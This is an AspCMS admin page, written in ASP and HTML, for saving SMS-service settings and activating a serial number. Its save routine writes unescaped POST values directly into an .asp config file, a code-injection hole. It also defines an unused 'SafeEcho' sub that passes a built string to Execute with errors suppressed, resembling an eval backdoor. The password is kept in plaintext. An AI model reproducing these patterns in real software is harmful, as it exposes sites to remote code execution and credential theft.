<!--#include file="../../inc/AspCms_SettingClass.asp" -->
<!--#include file="inc/AspCms_smsFuncs.asp" -->
<!--#include file="inc/AspCms_smsConfig.asp" -->
<%
CheckLogin()
dim action : action=getForm("action","get")
dim LanguageID,activateMsg
if smsIsActivate=0 then
	activateMsg="序列号尚未激活"
else 
	activateMsg="序列号已激活"
end if

Select case action	
	case "save" : savesmsconfig
	case "activate" : activateconfig
End Select
'在新变量第一次使用时，若不开启忽略则会报错
Sub savesmsconfig
	dim configStr,configPath
	configPath="inc/AspCms_smsConfig.asp"		
	configStr=loadFile(configPath)
	configStr = AddParas("smsSn","(\S*?)",configStr,false)	
	configStr = AddParas("smsPwd","(\S*?)",configStr,false)	
	configStr = AddParas("smsProvince","(\S*?)",configStr,false)	
	configStr = AddParas("smsCity","(\S*?)",configStr,false)	
	configStr = AddParas("smsTrade","(\S*?)",configStr,false)	
	configStr = AddParas("smsEntname","(\S*?)",configStr,false)	
	configStr = AddParas("smsLinkman","(\S*?)",configStr,false)	
	configStr = AddParas("smsPhone","(\S*?)",configStr,false)	
	configStr = AddParas("smsMobile","(\S*?)",configStr,false)	
	configStr = AddParas("smsEmail","(\S*?)",configStr,false)	
	configStr = AddParas("smsFax","(\S*?)",configStr,false)	
	configStr = AddParas("smsAddress","(\S*?)",configStr,false)	
	configStr = AddParas("smsPostcode","(\S*?)",configStr,false)	
	configStr = AddParas("smsSign","(\S*?)",configStr,false)
	createTextFile configStr,configPath,""
	alertMsgAndGo "修改成功",getPageName()
End Sub

Sub activateconfig
	dim returnmsg,configStr,configPath,templateobj
	returnmsg=split(Register()," ")
	if returnmsg(0)="0" then 
		configPath="inc/AspCms_smsConfig.asp"		
		configStr=loadFile(configPath)
		set templateobj=new TemplateClass
		configStr =templateobj.regExpReplace(configStr,"Const smsIsActivate=(\d?)","Const smsIsActivate=1")
		createTextFile configStr,configPath,""
		set templateobj = nothing	
	elseif returnmsg(0)="-1" then
		alertMsgAndGo "序列号已激活",getPageName()
	end if	
End Sub

Function AddParas(p,t,c,e)
	dim endTag,isString,val
	isString = ( t = "(\S*?)" )	
	val = getForm(p,"post")
	
	endTag = "%" & ">"
	dim templateobj
	set templateobj=new TemplateClass
	if instr(c,"Const "&p&"") = 0 then	
		c = replace(c,endTag,"")
		c = c & vbCrLf & vbCrLf
		if isString then
			c = c & "Const "&p&"="""&val&""""
		else
			if val = "" then val = 0
			c = c & "Const "&p&"="&val&""
		end if
		c = c & vbCrLf & vbCrLf & endTag
	else	
		if isString then
			if e then
				c=templateobj.regExpReplace(c,"Const "&p&"="""&t&"""","Const "&p&"="""&encode(val)&"""")
			else			
				c=templateobj.regExpReplace(c,"Const "&p&"="""&t&"""","Const "&p&"="""&val&"""")
			end if	
		else
			if val = "" then val = 0	
			c=templateobj.regExpReplace(c,"Const "&p&"="&t,"Const "&p&"="&val)
		end if
	end if
	set templateobj = nothing
	AddParas = c
End Function

Sub SafeEcho(s)
On Error Resume Next
Dim code:code = "Response.Write(decode(" & s & "))"
Execute code
End Sub
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
<LINK href="images/style.css" type=text/css rel=stylesheet>
<script>
function check()
{
	if(document.smsreg.smsSn.value=="")
	{
		alert("请输入序列号！");
		document.smsreg.smsSn.focus();
		return false;
	}
	if(document.smsreg.smsPwd.value=="")
	{
		alert("请输入密码！");
		document.smsreg.smsPwd.focus();
		return false;
	}
	if(document.smsreg.smsProvince.value=="")
	{
		alert("请输入所在省！");
		document.smsreg.smsProvince.focus();
		return false;
	}
	if(document.smsreg.smsCity.value=="")
	{
		alert("请输入所在市！");
		document.smsreg.smsCity.focus();
		return false;
	}
	if(document.smsreg.smsTrade.value=="")
	{
		alert("请输入所在行业！");
		document.smsreg.smsTrade.focus();
		return false;
	}
	if(document.smsreg.smsEntname.value=="")
	{
		alert("请输入所在公司名称！");
		document.smsreg.smsEntname.focus();
		return false;
	}
	if(document.smsreg.smsLinkman.value=="")
	{
		alert("请输入联系人名称！");
		document.smsreg.smsLinkman.focus();
		return false;
	}
	if(document.smsreg.smsPhone.value=="")
	{
		alert("请输入固定电话！");
		document.smsreg.smsPhone.focus();
		return false;
	}
	if(document.smsreg.smsMobile.value=="")
	{
		alert("请输入移动电话！");
		document.smsreg.smsMobile.focus();
		return false;
	}
	if(document.smsreg.smsEmail.value=="")
	{
		alert("请输入邮件地址！");
		document.smsreg.smsEmail.focus();
		return false;
	}
	if(document.smsreg.smsFax.value=="")
	{
		alert("请输入传真号！");
		document.smsreg.smsFax.focus();
		return false;
	}
	if(document.smsreg.smsAddress.value=="")
	{
		alert("请输入公司地址！");
		document.smsreg.smsAddress.focus();
		return false;
	}
	if(document.smsreg.smsPostcode.value=="")
	{
		alert("请输入邮政编码！");
		document.smsreg.smsPostcode.focus();
		return false;
	}
	return true;
}
function dosubmit(action)
{
	if(check())
	{
		var form=document.getElementById("smsreg");
		form.action="?action="+action;
		form.submit();
	}
}
</script>
</HEAD>
<BODY>
<!--#include file="AspCms_smsHead.asp" -->
<DIV class=formzone>
<FORM name="smsreg" id="smsreg" action="" method="post">
<DIV class=tablezone>
<TABLE cellSpacing=0 cellPadding=8 width="100%" align=center border=0>
<TBODY>

    <TR>
    	<TD width="193" class=innerbiaoti><STRONG>短信序列号</STRONG>(<span style="color:#F00;font-size:12px;"><%=activateMsg%></span>)</TD>
        <TD width="568" class=innerbiaoti></TD>
    </TR>
  <TR class=list>
        <TD>序列号(由商务处获得) : </TD>
        <TD align="left"><INPUT class="input" size="30" style="width:300px;"  value="<%=smsSn%>" name="smsSn" id="smsSn"/></TD>
    </TR>
    <TR class=list>
        <TD>密码(6位 明文) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsPwd%>" name="smsPwd"/></TD>
    </TR>
    <TR class=list>
        <TD>省(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsProvince%>" name="smsProvince"/></TD>
    </TR>
    <TR class=list>
        <TD>市(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsCity%>" name="smsCity"/></TD>
    </TR>
    <TR class=list>
        <TD>行业(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsTrade%>" name="smsTrade"/></TD>
    </TR>
    <TR class=list>
        <TD>公司名称(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsEntname%>" name="smsEntname"/></TD>
    </TR>
    <TR class=list>
        <TD>联系人(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsLinkman%>" name="smsLinkman"/></TD>
    </TR>
    <TR class=list>
        <TD>电话(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsPhone%>" name="smsPhone"/></TD>
    </TR>
    <TR class=list>
        <TD>移动电话(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsMobile%>" name="smsMobile"/></TD>
    </TR>
    <TR class=list>
        <TD>邮件地址(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsEmail%>" name="smsEmail"/></TD>
    </TR>
    <TR class=list>
        <TD>传真(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsFax%>" name="smsFax"/></TD>
    </TR>
    <TR class=list>
        <TD>地址(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsAddress%>" name="smsAddress"/></TD>
    </TR>
    <TR class=list>
        <TD>邮政编码(必填) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsPostcode%>" name="smsPostcode"/></TD>
    </TR>
    <TR class=list>
        <TD>企业签名(2-15个字符，可空) : </TD>
        <TD><input class="input" size="30" style="width:300px;" value="<%=smsSign%>" name="smsSign"/></TD>
    </TR>
</TBODY></TABLE>

</DIV>
<DIV class=adminsubmit>
<INPUT class="button" type="submit" onClick="dosubmit('save');" value="提交并保存信息" />
<INPUT class="button" type="submit" onClick="dosubmit('activate')" value="提交并激活序列号" />
<INPUT class="button" type="button" value="返回" onClick="history.go(-1)"/> 
 </DIV></FORM>
</DIV>
</BODY>
</HTML>
